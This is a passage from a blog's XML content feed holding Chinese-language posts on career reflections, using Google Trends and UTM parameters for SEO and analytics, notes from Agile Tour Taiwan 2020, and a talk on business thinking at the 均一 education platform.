title="希望做像是哪些人的工作?"></a>希望做像是哪些人的工作?</h2><p>工作專業上，在我認為的第一階段，說穿了就是為了錢，那賺錢本身目前最崇拜的粉專是大俠武林，大俠強調的是專注本業閒錢投資，我工作即將第六年也是至今最多錢的工作，比起第一份薪水調整了超過 60%，所以認為對三十歲前的年輕人來說，投資自己絕對是最值得的選擇:</p><blockquote><p>周老曾鼓勵我們: 接受成功但不要追求成功，過一個無愧於心的自在生活<br>象總大大: 不用特別去追求薪水，只要賺好事、賺好人最後自然就會賺錢</p></blockquote><p>31 歲快過完了，當然還是會懷疑自己的能力，畢竟工作上並不像大部分同學一開始就進入高薪的產業，不得不說產業別真的影響很大，情緒上的波動和管理還是沒有做到很好，有時候煩躁起來就會不開心，該做好的是好好<a href="https://linyencheng.github.io/2025/08/02/kimetsu-no-yaiba/emotion-management/">靜下心來發揮各種影響力，不管是影響自己或是團隊</a>。</p><p>難道說都是一直沒什麼自信嗎? 因為生活圈比較熟的同學、朋友大多都是前 10% 的範圍裡面，所以大部分的時候都會覺得自己明明念了一個還可以的大學跟研究所，為什麼表現就是普通了不只一些? 大概是直到某個時刻，在跟其他人聊天的時候，才發現原來覺得跟吃飯喝水一樣簡單的東西竟然也有人不會，也才發現好像是有那麼點成長而稍微有點放心了。</p><p>這兩年讀了蠻多書，前幾年更是連續經歷了家人們的過世，常常會想人生可能不只是在工作中做了什麼，而是在工作之外還能從生活中累積什麼，喜歡讀的書就去讀、喜歡爬的山就去爬、喜歡吃的食物就去吃，每個決定和選擇，造就了現在的我們，就像鬼滅台詞裡頭說的我們因為守護所愛的人事物而脆弱，但也因為他們而強悍。</p><blockquote><p>衰老和死亡是生命短暫人類這種生物的美好之處。因為會衰老、會死亡，才更加令人覺得可愛、尊貴。</p></blockquote><p>看完了我的故事，你的勒?!!! 每個人都是獨立的個體、獨立的價值觀，不同的劇本理論上沒有好或壞只是不太一樣，我想也因為我們會懷疑、會後悔、會遺憾、會反思生活，生活才更有趣。</p><p>最後，如果有什麼問題或想討論的東西，歡迎寄信到這裡 <a href="mailto:linyencheng.tw@gmail.com">linyencheng.tw@gmail.com</a> 跟我聊聊，或是到粉專<a href="https://www.facebook.com/linyencheng.tw">前端三分鐘</a>幫忙按個讚直接訊息我也很歡迎 :)</p><p>同場加映:</p><ul><li><a href="/2020/11/17/career-remote-work-interview/?utm_source=link&utm_medium=article&utm_campaign=internal_link">22K 很少，那如果是三份 22k+ 的工作呢</a></li><li><a href="/2020/11/25/career-remote-work-life/?utm_source=link&utm_medium=article&utm_campaign=internal_link">怎麼兼職? 身兼三份工作的真實樣貌</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星星女孩</title>
      <link href="/2021/01/24/career/career-how-to-be-a-project-manager/"/>
      <url>/2021/01/24/career/career-how-to-be-a-project-manager/</url>
      
        <content type="html"><![CDATA[<p>前陣子，看了台灣工程師在矽谷的直播 (去年超幸運聽到在台大那場分享就被圈粉)，這次聽到<a href="http://bit.ly/2Zvkzb5">訪問星星女孩的故事</a>內心很是激動，於是立馬去借了書來看，看書的過程中，<a href="https://www.facebook.com/groups/nckunion/permalink/2621610241204879/">成大校友會社團有個人來開地圖砲</a>，激起大家熱烈迴響，很幸運的，才有這個機會跟<a href="https://www.facebook.com/groups/nckunion/permalink/2628689733830263/">厲害的學長吃飯</a>，這周末又聽了溫暖 100% 的分享，於是想稍稍整理一下心得。</p><blockquote><p>時間有限，很多事情都想要嘗試，就需要提早計畫</p></blockquote><p>星星女孩，高中參加北一女熱舞社然後是投資理財創社社長，高二開始準備申請 MIT，大學四年實習三次 (中研院、大摩、google)，其中有一年去劍橋交換，2014 年 MIT 畢業，大四修完大部分研究所課程，碩士預計一年畢業，後面在學的時間除了寫論文都在工作，現在在 Facebook 粉絲專頁的 Team。</p><p>以上，可以看出真的是一個很善於計畫的人，書中有提到家庭教育中一個很特別的投籃理論，因為人如果沒有嘗試過就不會知道是不是適合，所以從小爸媽就給了她很多機會去各種嘗試，也是因為這樣才有機會進入希望學生全人發展的 MIT。</p><blockquote><p>如果不知道要去哪，在哪裏、做什麼或許一點都不重要</p></blockquote><p>學長的分享，很受用的觀念也是如此，學長的目標真的很遠大，很早就立定志向想要成為一個跨國企業的 CFO，想讓世界，看見台灣，因為台灣，肯定是有能力培養出這樣的人才。</p><p>由於學長很早就發現對數字上的熱忱，即使在早期風氣較保守 (悠哉) 的成大，還是數次北上台北參與實習與比賽，此外學長還說了一個故事：</p><p>愛莉絲在迷路的時候，去問了那隻肥貓，我現在在哪裡？貓反問那妳想去哪裏，如果不知道要去哪，妳在哪裏一點都不重要。</p><p>分享當天我最被打到的一句話：</p><blockquote><p>目標清楚方向正確，爬也會爬到，時間問題</p></blockquote><p>對 MIT 的學生來說，生活從來就不只是唸書而已，每個人更重視的是，自己的人生目標是什麼，該怎麼追求，念書只是達成目標的手段之一。</p><p>學長也問了，你工作是為了什麼？你有沒有想過，最想要做的事情什麼？為什麼要活著有想過嗎？要有清楚的目標，有想要做的就去做，不然過了幾年，還是不會有任何改變。</p><p>想要做得比別人更好，就是比別人更早做準備。(吃個飯真是滿滿的打擊 QQ)</p><blockquote><p>想要的生活，要怎麼去達到</p></blockquote><p>這周末聽了施易男的分享，剛開始看到超多迷妹，想說靠太扯囉… 是不是走錯棚了？！！！聽著聽著也才深刻感受到努力的過程還有成長，從因為爸爸生病賣掉房子，拼命的南北奔波工作賺醫藥費，然後面對媽媽的過世，練習轉念走出親人離世的黑洞。</p><p>事業上從演員跨足到馬卡龍的製作和出書，過程中還是不斷的學習，像是平面設計、室內設計、網頁設計、甜點證照，曾經媽媽問他，都當到知名演員爽賺就好了，為什麼還要停掉通告做這些？因為，是想要的生活啊。</p><blockquote><p>在追求目標的過程中，我們也會不斷的成長</p></blockquote><p>這幾年，好幾次被嗆爆工作存錢到底是要做什麼，真心話是我真的不知道自己真心想做的事情是什麼，尤其是當把社群軟體關掉之後 QQ</p><p>像是，如果不打卡，還會想跑馬拉松或是去紐西蘭嗎？如果，有那麼一天，做的事情不再是為了打卡分享就能夠感受到內心的飽滿，那或許，就會是想要做的事情了吧？</p><p>接下來的生活，還是會繼續的嘗試！！！就像曾經，也天真的以為在台南爽過就是想要的生活，但在幾年後現在，可支配的錢比讀書多很多、Loading 比讀書小很多，這幾個月每天三四點就下班，坦白說也沒有比較快樂，反而還越來越焦慮 QQ 不斷的想，這真的是想要的生活嗎？這幾周，有時睡不太好就不斷問自己。不過，該慶幸的是，在這樣的過程中我們也不斷成長，也許這就是比當歸長一點的人蔘吧。</p>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google Trends 變身鍵盤柯南</title>
      <link href="/2021/01/16/marketing-google-tools/"/>
      <url>/2021/01/16/marketing-google-tools/</url>
      
        <content type="html"><![CDATA[<p>先分享一篇實戰<a href="/2021/05/07/marketing-seo-blog/?utm_source=link&utm_medium=article&utm_campaign=internal_link">部落格搜尋引擎優化方法，談談操作 SEO 讓 MAU 從 3000 到 4000+ 的過程</a>，提供給大家參考。</p><h2 id="什麼是-Google-Trends"><a href="#什麼是-Google-Trends" class="headerlink" title="什麼是 Google Trends?"></a>什麼是 Google Trends?</h2><p>Google Trends (搜尋趨勢) 透過演算法找出趨勢關鍵字並提供即時熱搜的<a href="https://trends.google.com/trends/hottrends/visualize?geo=TW&category=all&nrow=5&ncol=5&pn=p12">關鍵字動態牆</a>，也提供指定國家、時間、資料來源來進行關鍵字比對的功能。</p><blockquote><p>Google 搜群趨勢牆<br><img src="/2021/01/16/marketing-google-tools/GoogleTrendWall.png" alt="GoogleTrendWall"></p></blockquote><h2 id="怎麼運用-Google-Trends"><a href="#怎麼運用-Google-Trends" class="headerlink" title="怎麼運用 Google Trends?"></a>怎麼運用 Google Trends?</h2><p>在優化網站關鍵字進行相關行銷前首要是確定，大致上拆分成四個步驟</p><ol><li>利基市場: 選定一個議題，這個關鍵字是不是很多人在競爭，有辦法持續成長嗎? 為什麼受關注或不受關注?</li><li>受眾: 誰了解這件事會很重要? 誰會關注這樣個關鍵字?</li><li>分析重要的原因或關鍵</li><li>想推廣的原因?</li></ol><p>接下來就需要運用 Google Trends 和搜尋相關工具，去列出和觀察利基市場的相關關鍵字，也可以進一步去比較競爭對手的。</p><p>在實作上會有三種方式可以去做:</p><ol><li>趨勢關鍵字: 透過 Google Trends，列出不同時間區段的關鍵字熱搜狀態</li><li>自動完成關鍵字: 透過搜尋自動完成</li><li>關鍵字工具: 善用關鍵字外掛和工具</li></ol><p>透過熱門的趨勢關鍵字和對手的分析後，接下來就是測試新的關鍵字組合還有找出自己獨特的賣點去進行操作。</p><h3 id="Google-Trends-趨勢關鍵字"><a href="#Google-Trends-趨勢關鍵字" class="headerlink" title="Google Trends 趨勢關鍵字"></a>Google Trends 趨勢關鍵字</h3><p>首先示範用 Google Trend 來看台灣地區搜尋嬰兒哭的比例，時間在凌晨 2~4 點時到達顛峰所以可以發現無助的爸媽通常在這時間起床，所以如果 google、line、FB 要推播怎麼處理嬰兒哭的廣告或產品，這時候會非常適合。</p><blockquote><p>嬰兒哭<br><img src="/2021/01/16/marketing-google-tools/cry.jpg" alt="cry"></p></blockquote><p>另外可以想見的像是 2018 選舉的搜尋次數絕對被 7-11 優惠卡娜赫拉海放。但也會發現有趣的現象，像是大選過後搜尋移民的趨勢:</p><blockquote><p>2018 選舉後搜尋移民<br><img src="/2021/01/16/marketing-google-tools/vote.png" alt="vote"></p></blockquote><p>今年兩次罷免案的搜尋趨勢，可以看出議員的罷免在半年前大家就開始關心，所以這次拿到八萬的罷免票也可以說是實至名歸?!</p><blockquote><p>2020、2021 罷免、王浩宇、韓國瑜搜尋趨勢<br><img src="/2021/01/16/marketing-google-tools/recall.png" alt="recall"></p></blockquote><h3 id="Google-搜尋自動完成關鍵字"><a href="#Google-搜尋自動完成關鍵字" class="headerlink" title="Google 搜尋自動完成關鍵字"></a>Google 搜尋自動完成關鍵字</h3><p>除了透過 Google Alert, Google Trend 來找出熱搜關鍵字外，我們也可以透過 Google Search 的自動完成來看，接下來會示範 20 歲、30 歲的自動完成字串有怎麼樣的不同，透過這樣的測試可以知道關鍵字延伸出來的其他關鍵字 (長尾關鍵字)，另外在輸入關鍵字時，也可以在關鍵字前面或後面加上 <code>*</code> 讓 Google 自動協助補成更完整的搜尋關鍵字。</p><blockquote><p>20 歲 vs 30 歲在意的事情 (到底多在意長高???)<br><img src="/2021/01/16/marketing-google-tools/20.jpg" alt="20"></p></blockquote><p>另外如果是跟我思維邏輯比較像的女孩子，買衣服下關鍵字可能會很精確，像是 “甜美 雪紡紗 洋裝 過膝”，發現這樣的目標對象後，如果搭配農民曆外加發獎金的時間，如果又可以推個 “婚禮洋裝必搭外套”，大概很高機率讓人想剁手。</p><h4 id="網路名聲管理-online-reputation-management-seo"><a href="#網路名聲管理-online-reputation-management-seo" class="headerlink" title="網路名聲管理 (online reputation management seo)"></a>網路名聲管理 (online reputation management seo)</h4><p>透過 SEO 其實也能夠反向的操作網路名聲 (online reputation management seo)，有些知名的公眾人物有時候會透過公開言論來想辦法洗掉熱搜的自動完成關鍵字。</p><p>英國首相強森發生過雙層巴士刊登廣告的負面事件 “Boris Johnson Bus”，他就曾利用在記者會上說出『巴士 (Bus)』，我喜歡做巴士的模型來想辦法洗掉這個關聯。</p><h3 id="關鍵字工具"><a href="#關鍵字工具" class="headerlink" title="關鍵字工具"></a>關鍵字工具</h3><p>推薦四個幫我們做好平台的搜尋分析、關鍵字推薦免費的關鍵字工具:</p><ol><li>平台的搜尋分析: <a href="https://keywordtool.io/">keywordtool</a></li><li>關鍵字推薦: <a href="https://chrome.google.com/webstore/detail/keywords-everywhere-keywo/hbapdpeemoojbophdfndmlgdhppljgmp">keyword everywhere</a></li><li>Google Alert: 用關鍵字進行訂閱，可以針對特定主題建立並設定相關提醒，這樣當 Google 搜尋中出現與該主題相關的新結果時，就會收到通知</li></ol><h2 id="關鍵字成效分析"><a href="#關鍵字成效分析" class="headerlink" title="關鍵字成效分析"></a>關鍵字成效分析</h2><p>決定和了解關鍵字後，透過 Google Search Console 則可以評估成效，可以看出受眾是透過什麼關鍵字進到網站。</p><h3 id="Google-Search-Console"><a href="#Google-Search-Console" class="headerlink" title="Google Search Console"></a>Google Search Console</h3><p>如果真的要投放廣告也可以透過搜尋字詞報表來觀察消費者搜尋什麼，那關鍵字就可以依照報表去優化。</p><p>分享一些之前聽講座聽到的統計:</p><ul><li>目前 50 ～ 70% 手機搜尋</li><li>商品建議搭配三則文案</li><li>影片建議是 120 秒的影片，不過依照各個國情不同會有些許變化</li></ul><blockquote><p>關鍵字成效，看起來我的部落格就很需要優化 XDDD<br><img src="/2021/01/16/marketing-google-tools/GoogleSearchConsole.png" alt="GoogleSearchConsole"></p></blockquote><h3 id="Google-Analytics-分析"><a href="#Google-Analytics-分析" class="headerlink" title="Google Analytics (分析)"></a>Google Analytics (分析)</h3><p>我之前做了三次小實驗，因為我有將部落格連結放在 104 的自傳中，更新履歷後的隔天活耀的使用者就會明顯增加，還蠻有趣的，參加面試的當天，點擊量明顯也是平常的兩倍以上。</p><p>在 Google Analytics 也能夠透過 Organic Search (自然搜尋) 入站的人數是否有提升，來評估我們這次使用 Google Trend 的優化是否有效。</p><p>最後是 GA 提供的報表可以看出目標對象的相關統計，還可以搜尋網路上有先做好的樣板，並加入到自訂相關報表，就可以輕鬆顯示很多訊息了。</p><ul><li>時段及瀏覽量</li><li>使用者所在區域</li><li>是從 google 搜尋進來或是直接瀏覽</li><li>回訪率</li><li>使用的瀏覽器或是作業系統</li></ul><p>GA 中也可以透過手動區分流量來源來進行觀察，GA 提供了底下 5 種參數</p><ol><li><code>utm_source</code>: 來源，必填欄位，Ex: <code>google</code>、<code>blog</code></li><li><code>utm_medium</code>: 媒介，必填欄位，Ex: <code>cpc</code>、<code>email</code>、<code>banner</code></li><li><code>utm_campaign</code>: 名稱，必填欄位，Ex: <code>utm_campaign=spring_sale</code></li><li><code>utm_term</code>: 型態，選填，Ex: <code>running+shoes</code>、<code>20% OFF</code></li><li><code>utm_content</code>: 內容，Ex: <code>logolink</code> or <code>textlink</code> 可用來評估 A&#x2F;B 測試，看不同文案的效果</li></ol><p>舉例來說:</p><ul><li>部落格 (<code>utm_source=blog</code>)</li><li>橫幅中 (<code>utm_medium=banner</code>)</li><li>推廣的春季特賣 (<code>utm_campaign=spring_sale</code>)</li><li>8 折 (<code>utm_term=20% OFF</code>)</li><li>手表 (<code>utm_content=watch</code>)</li></ul><p>最後產生的連結就會長得像是這樣 <code>https://domain/?utm_source=blog&amp;utm_medium=banner&amp;utm_campaign=spring_sale&amp;utm_term=20%25off&amp;utm_content=watch</code>，這樣最後各個管道撒出去的連結進到 GA 的來源和媒介就不會都是 <code>direct/none</code> 啦!</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Agile Tour Taiwan 2020 心得分享</title>
      <link href="/2021/01/11/experience-sharing-agile-tour-2020/"/>
      <url>/2021/01/11/experience-sharing-agile-tour-2020/</url>
      
        <content type="html"><![CDATA[<p>這篇文章會分享聽 Agile Tour 2020 三場分享的心得，包含從週期圖看不同速度成員在同個團隊的狀況，如何用 Cynefin Framework 來談為什麼 20 個減肥 Sprint 會失敗? 遊戲化框架對團隊的幫助在哪?</p><blockquote><p>議程傳送門 <a href="https://agiletourtaiwan.org/agenda/">https://agiletourtaiwan.org/agenda/</a></p></blockquote><p>在心得開始之前，想先問大家有聽過 Agile 嗎? 先直接說我的看法:</p><ul><li>Agile 翻譯是敏捷</li><li>敏捷通常會聯想到速度</li><li>敏捷不完全等於快，也可能是增加專案修正的週期</li><li>生涯或團隊的最終目標都是增加 Productivity</li></ul><h2 id="週期圖看團隊成員速度"><a href="#週期圖看團隊成員速度" class="headerlink" title="週期圖看團隊成員速度"></a>週期圖看團隊成員速度</h2><blockquote><p>Q 不同速度的人要怎麼合作? 不同速度的生物怎麼在同個生態系中共存共榮?</p></blockquote><p>這次的主題是敏捷組織內，是你在跑步還是我在走路? 活動的開始，講師帶領大家 Check In 的破冰活動是選擇一隻代表自己速度的動物自我介紹，接著用不同速度感的動物分組，體驗不同速度感的團隊怎麼溝通，我覺得這個破冰活動很棒，原因是</p><ul><li>用動物介紹自己比較沒有侵入性</li><li>不同速度的動物在同一組討論能夠增加異質性</li><li>速度感的代表性還蠻明顯的，速度感也可以分成兩種看法<ul><li>時速: 60 km&#x2F;hr，偏重當下的速度</li><li>配速: 6 分速，偏重一分鐘可以完成多少事情</li></ul></li></ul><blockquote><p>QA 如果把當下組織當成活的生態系，不同速度的生物在加入時會有哪些情境和情緒?</p></blockquote><p>想像剛進公司到離開，有哪些情境跟情緒，探討隨著了解和到達輸出的極大化的過程中會遇到的速度感、情境、情緒。</p><p>舉例來說: 我過去待的都是相對自己能力比較普通的公司，只要是時程合理的專案，遇到的通常都是人的問題居多，個人成長的速度在有意識的安排底下通常都是超過公司速度的，才會出現跳槽的問題。</p><p>剛開始工作的時候，我是一個後端工程師，一週的工作量大都能在四天左右完成，剩下半天是跟主管確認和寫週報，最後半天到一天是可以學習任何跟公司或專案相關的任何技術，我也是在那個時候自學前端相關的知識，現在仔細想想那時候也是每週一次小 Sprint 的概念。</p><blockquote><p>QA 情境跟情緒如果要分四個階段會怎麼分? 這個階段的速度感如何?</p></blockquote><ul><li>多週期的職涯</li><li>薪資上的成長</li><li>職能上的成長</li></ul><p>切割成四個周期後，就能夠畫出週期圖，週期可以看成是爬山的過程，由於我們並不會一直待在頂峰，那在下山的路上，我們該如何看待自己和團隊的狀態、速度感。</p><blockquote><p>QA 公司目前這四個階段的挑戰、優勢在哪邊，這四個階段跟個體職涯本身的階段是相同的嗎?</p></blockquote><ul><li>識別自己的階段速度跟環境的階段與速度</li><li>週期可以用來觀察各方面，像是薪水在同個公司同個職位的增加速度會先上升，增幅低於通膨則開始下降<ul><li><a href="https://www.stockfeel.com.tw/%E6%8A%80%E8%A1%93%E6%8E%A1%E7%94%A8%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F/">技術採用生命週期</a></li><li><a href="https://www.facebook.com/photo/?fbid=4037900486222320&set=gm.698914000815708scription">績效表現與壓力</a></li></ul></li></ul><blockquote><p>團隊狀態週期圖<br><img src="/2021/01/11/experience-sharing-agile-tour-2020/CycleDiagram.JPG" alt="CycleDiagram"></p></blockquote><p>不管是家庭、職場或是人生，敏捷本身強調的是快速調適的能力，當不滿意或是委屈的心情出現的時候，往往我們導入方法常常都在想怎麼改變團隊，但是 vision 跟 reality 之間拉扯的張力通常會讓隊友不舒服。</p><p>有時候也可以反思怎麼把自己調適成適合團隊發展的成員，敏捷不只是把組織變成想要的樣子，也能夠試著把自己變成適合組織的樣子。</p><h2 id="Cynefin-Framework-分析"><a href="#Cynefin-Framework-分析" class="headerlink" title="Cynefin Framework 分析"></a>Cynefin Framework 分析</h2><blockquote><p>減肥是怎麼樣的問題? 為什麼會失敗?</p></blockquote><p>講者分享的題目是從 20 個 Sprints 減重成功（或失敗）的經驗來看組織敏捷轉型之路，我覺得體驗活動的部分很厲害，講師透過體驗活動讓我們先發現可能的問題出現在哪邊，然後才帶我們了解 Cynefin Framework，體驗活動的開始是希望小組的大家在不講話溝通的情境底下達到講師的要求:</p><ul><li>按照身高排序</li><li>按照進教室時間排序</li><li>分成五人內的小組</li><li>組成一個 A</li><li>組成飛機的形狀</li><li>組成壽司的形狀</li></ul><p>體驗活動的心得</p><ul><li>知識由經驗累積</li><li>等待第一個動作的人</li><li>問題有分不同的類型</li><li>怎麼在不講話的情況下同步大家的知識、想像</li></ul><p>Cynefin Framework 是解析問題的一種方法，用來幫助我們做優先順序的決定，當然也可以加入花費時間、產出效益、困難度來增加分析。</p><ol><li>有序、簡單 (Obvious): 按照身高排列 (簡單到不需要流程)</li><li>有序、繁雜 (Complicated): 按照進教室時間排列</li><li>無序、複雜 (Complex): 組成一個 A，需要等有人先有試探性地帶領動作</li><li>無序、無法估計 (Chaotic)</li></ol><table><thead><tr><th>不同種類的問題，會有不同的應對方法</th><th></th></tr></thead><tbody><tr><td>3. 無序、複雜: 試探 → 觀察 → 因應</td><td>2. 有序、複雜: 觀察 → 分析 → 因應</td></tr><tr><td>4. 無序、無法估計: 行動 → 觀察 → 因應</td><td>1. 有序、簡單: 觀察 → 分類 → 因應</td></tr></tbody></table><p>其他常見流程管理</p><ul><li>OOAD: Observe → Orient → Decide → Act</li><li>PDCA: Plan → Do → Check → Action</li></ul><p>流程管理像是 PDCA 就是剛開始工作主管要求我做的，我在每周四的下午和主管 check 過後到周五結束前都是我可以 Plan 的時間，提早完成就可以學其他自己想學的技術。</p><p>回顧 20 個 Sprints 減重成功（或失敗）的經驗，過程中最重要的是每次迭代要有增量，是否有更接近最終想要達到的終點或結果。</p><ul><li>減肥問題看起來是 Obvious 實際上是 Complex</li><li>太晚觀察和建立壓力大的行為模式</li><li>幾次回顧會發現其實不想做 Scrum Master</li><li>能否在外部角度看問題，是否看出狀態、想法</li><li>減重只有一種方法有效，只有你願意堅持的那一種</li></ul><h2 id="遊戲化框架"><a href="#遊戲化框架" class="headerlink" title="遊戲化框架"></a>遊戲化框架</h2><blockquote><p>是什麼讓打遊戲的人這麼快樂?</p></blockquote><p>遊戲化的八角框架，透過八個內、外部動機，來分析歸納遊戲化設計怎麼發揮影響力。</p><ul><li>黑帽 vs 白帽</li></ul><ol><li>白帽核心動力: 強大、圓滿、滿意</li><li>黑帽核心動力: 著迷、焦慮、上癮</li></ol><ul><li>內、外部動機</li></ul><ol><li>Epic Meaning: 有義務完成什麼 eg 成就感，可以找下一個更好的工作 or 專案能夠有影響力</li><li>Avoidance: 損失與避免 eg 對失去的恐懼</li></ol><ul><li>外部動機 (目標導向)</li></ul><ol><li>Accomplishment: 發展與成就 eg 點數、成長視覺化</li><li>Scarcity: 稀缺與迫切 eg 競爭稀缺資源</li><li>Ownership: 所有權與佔有慾 eg 產生想要 “改進”、”保護” 的心態</li></ol><ul><li>內部動機 (體驗導向)</li></ul><ol><li>Empowerment: 創造力與回饋 eg 創造自己的貢獻 or 樂高</li><li>Unpredictability: 不確定性、好奇 eg 發票抽獎活動、想了解未知的動機</li><li>Social Influence: 社會影響力與同理心 eg 歸屬感、師徒制、影響力小隊</li></ol><p>如果從遊戲化框架來回頭看團隊與個人的目標</p><ul><li>連結要能被量化、排序</li><li>人不是機器，只會執行期望的工作，成長或是待遇委屈都會離開</li><li>人們喜歡感覺自己聰明</li><li>了解現在不同人的狀態、期望、對事情的態度</li><li>引導設計自我增強計畫和回顧</li></ul>]]></content>
      
      
      <categories>
          
          <category> 軟體工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>關於教育！均一教育平台 呂冠緯 Ｘ 商業思維學院 Gipi</title>
      <link href="/2020/12/29/career/career-business-think/"/>
      <url>/2020/12/29/career/career-business-think/</url>
      
        <content type="html"><![CDATA[<p>當均一有個願景使命在的時候，目的是去解那個問題，商業思維就是跳脫出來去思考有一筆錢或資源，我們會怎麼去使用，<a href="https://www.facebook.com/103829960984125/videos/203072871316662">對談的連結點我</a>。</p><blockquote><p>目標: 擴大影響力<br>假設: 募到超過三倍的資源，我們會做什麼樣的決定?</p></blockquote><h2 id="商業思惟是聚焦在真正要解決的問題"><a href="#商業思惟是聚焦在真正要解決的問題" class="headerlink" title="商業思惟是聚焦在真正要解決的問題"></a>商業思惟是聚焦在真正要解決的問題</h2><p>回過頭去反思真正想要加速的東西，當資源有限的時候，是不是關注在這樣的事情上，什麼是真正要解決的問題:</p><ul><li>讓孩子成為終身學習者</li><li>提供規模化的學習環境</li></ul><p>早期都在把資源拉進組織，像是募款或是找志工，走到一個階段當帳面上增量出現瓶頸的時候，就會去思考怎麼繼續擴大影響力?</p><p>商業思維本身不一定是賺錢，本質是怎麼有效率的達到供需之間的交流，影響力的達到，影響力去幫到誰，仍舊是一個供需的交流，蘋果就影響了一整個生態系，鴻海、台積電代工為了 iPhone 這個目標，均一雖然不代表全部的教育體系，但不代表不能影響和協同整個教育環境。</p><p>教育最重要的就是內容，均一目前只有 30 位的全職夥伴，均一做內容增量會達到一個頂，那怎麼槓桿外部生態系，在同個目標上持續前進讓更好的內容持續產出是均一今年在做的事情。</p><p>那槓桿本身要怎麼發生，雖然均一沒有拿台北市的資源，但改成協助台北市政府去做出更好的教育資源，協做出的資源能夠放在均一和北市的平台:</p><ul><li>對台北市是好的，得到了更好的品質</li><li>對均一是好的，拿到了更多的資源</li><li>對全台是好的，能夠讓全台享受這樣的結果</li></ul><p>未來如果有一天教育部也發現能夠加入，就有機會成為一條教育內容的高鐵，這也就是均一雖然是非營利組織，但選擇今年開始做 BD 跟 Branding 和政府關係，這些改變和創新來自於限制，預算固定的情況下，要怎麼增加影響力的想法轉變。</p><h2 id="命題"><a href="#命題" class="headerlink" title="命題"></a>命題</h2><p>在解決問題的過程中是相對重要的，所以今年命題變成: 如果今天預算是穩定的，我們要怎麼持續擴大影響力，所以教育這場遊戲可以影響誰? 誰是最重要的規則制定者跟遊戲者? 就會發現政府其實是球員兼裁判，所以 BD 的目標就會變成</p><ul><li>找到政府協作點</li><li>找到政府機要</li><li>政府需要讓人民理解和正面喜歡，均一的品牌也對政府產生重要性</li></ul><h3 id="均一的-BD-做的是生態系的槓桿"><a href="#均一的-BD-做的是生態系的槓桿" class="headerlink" title="均一的 BD 做的是生態系的槓桿"></a>均一的 BD 做的是生態系的槓桿</h3><p>也許跟生態系合作比起跟外部要進來資源轉化成自己想要的樣子有差異，但環境整體是一直在變好的</p><ul><li>b2c: 是均一過去的基礎，再去發展</li><li>b2g2c: 成為政府想要影響教育時最好的夥伴</li><li>b2b2c: 企業想要投入教育或是 CSR 的夥伴</li></ul><h3 id="b2b2c-在今年均一和-Line-的合作"><a href="#b2b2c-在今年均一和-Line-的合作" class="headerlink" title="b2b2c 在今年均一和 Line 的合作:"></a>b2b2c 在今年均一和 Line 的合作:</h3><ul><li>因為 108 課綱中有素養教育，Line 本身重視假新聞，合作出科學媒體素養的課程，談疫情和疫苗</li><li>Line 提供了捐款、工具的使用讓均一拿到了資源</li><li>均一產出了新的課程</li><li>Line 做了 CSR 也有教育類的突破創新</li></ul><h3 id="跨組織的合作"><a href="#跨組織的合作" class="headerlink" title="跨組織的合作"></a>跨組織的合作</h3><ul><li>誠致教育基金會，公辦民營</li><li>TFT，偏鄉師培</li><li>均一，教育科技</li></ul><p>追求增長之後可以思考的問題，Lifetime Value 去看，決定先從老師當成重點，雖然主要使用者是學生，但老師是核心，所以目前是要增加穩定用科技融入教育的老師，是一個改變教育的重要指標，目標是能夠形成一個教育體系，跟各縣市政府合作在教師的培育，從工具的操作到後續的課程串聯，找出有分享意願的老師成為接下來的老師，縣市政府再支持相關的老師。</p><p>雖然錢沒有進來，但造成的結果是相同的，當我們產生資源的能力有限，影響有影響力的人或組織一起協助這個環境朝向我們想要的方向。</p><h2 id="教育的個人化"><a href="#教育的個人化" class="headerlink" title="教育的個人化"></a>教育的個人化</h2><p>能夠透過科技去做到差異化授業，本質仍是生命影響生命、對話影響生命、基於觀察和了解去影響生命，協助老師成為學習上的教練，老師本身是不是也有自我改進的過程，師生關係可能會成為資深學習者和資淺學習者的概念?</p><p>沒有被教過怎麼面對挫折，高成就者修正經驗反而少，這部分特別可惜?</p><blockquote><p>當一個人不懂的時候，你罵他是沒用的</p></blockquote><p>終身學習，線上學習，社群學習，科技加速了大量轉化後的資訊、資源的搜尋與吸收，下一代的教育顯然會跟現在有很大的差異。</p><h2 id="把大家都拉到這個局的小學生創業商業思維"><a href="#把大家都拉到這個局的小學生創業商業思維" class="headerlink" title="把大家都拉到這個局的小學生創業商業思維"></a>把大家都拉到這個局的小學生創業商業思維</h2><p>參加了 Evonne 在工作生活家的分享，談小學生的商業思維，主要的內容如下面這個連結:</p><p><a href="https://evonneyifangtsai.medium.com/bizthinker-for-news-2359f28869c1">https://evonneyifangtsai.medium.com/bizthinker-for-news-2359f28869c1</a></p><p>小學生在學校出租熱點賺錢，背後的商業思維:</p><ol><li>找到需求營利模式: WiFi 熱點租用</li><li>建立門檻或便宜的附加服務: 行動電源</li><li>行銷: 每個月的免費放送日 (想殺價的人)</li><li>CSR: 定期請班上同學吃東西 (沒手機也不想用網路的人)</li><li>制定好規範，不可以讓守規則的人有失去感 (正義魔人)。想起之前聽皓甯大大分享的，有時候要照顧弱勢，也許第一個動作是先傷害</li><li>靠行銷、CSR、規範處理好利害關係人</li></ol><blockquote><p><img src="/2020/12/29/career/career-business-think/career-business-think.jpg"><br>Source: <a href="https://www.facebook.com/groups/wljofficial/permalink/693382911323815/">https://www.facebook.com/groups/wljofficial/permalink/693382911323815/</a></p></blockquote><p>可以練習看財報，知道台積毛利 50% 跟聯電 15% 的差別在哪，對自己公司的財報有了解嗎? 費用跟固定成本對公司的差異在哪? 外包行動電源的租用給同學，外包外送給外送平台。</p><ol><li><p>點 (自己)、線 (團隊)、面 (公司)、體 (產業) 